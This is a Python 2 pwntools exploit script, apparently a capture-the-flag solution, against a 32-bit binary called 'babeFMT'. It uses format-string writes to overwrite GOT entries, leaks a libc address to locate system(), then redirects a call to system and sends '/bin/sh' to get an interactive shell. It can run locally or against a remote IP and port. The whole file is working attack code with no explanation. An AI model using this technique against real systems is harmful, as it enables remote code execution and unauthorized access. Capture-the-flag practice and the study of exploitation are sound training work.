#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
# import fmtstr64
context.update(arch="i386", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./babeFMT")
elf = ELF(TARGET)
#libc = ELF("/lib/i386-linux-gnu/libc.so.6") # 830
libc = ELF("/usr/lib32/libc.so.6")
def attach(r):
    if LOCAL:
        # bkps = ['* 0x08049361',"* 0x08049346","* 0x08049383", "* 0x080492e6","* 0x08049300","* 0x0804934f","* 0x080492f7"]
        bkps = ["* 0x08049256"]
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    attach(r)
    p = "A A P"
    r.sendlineafter(":",p)
    

    readstr = 0x08049213
    puts_got = 0x804c01c
    main = 0x0804938E
    idx = 4
    # control eip
    pad = "AAAABBBBCCCCGGGG"
    x = pad
    # x += p32(puts_got+2)
    # x += "%{}c%4$hn".format((0xdeadbeef - 12) & 0xffff)
    x += fmtstr_payload(4, {puts_got:readstr})
    # x = "HHHHJJJJKKKK%p.%p.%p.%p.%p.%p.%p.%p.%p"
    print x
    r.sendline(x)
    r.sendline(">%26$p")
    r.recvuntil(">")
    leak = int(r.recvline().split()[0],16) #- 0xe808c
    base = leak - 0x743f9 
    sys = base + libc.sym['system']
    log.info("system: " + hex(sys))
    log.info("leak: " + hex(leak))
    log.info("base: " + hex(base))


    # print str(leak)
    o = ""
    o += fmtstr_payload(4, {0x804c014:sys})
    r.sendline(o)
    r.sendline("/bin/sh")
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("34.126.117.181", 2222)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
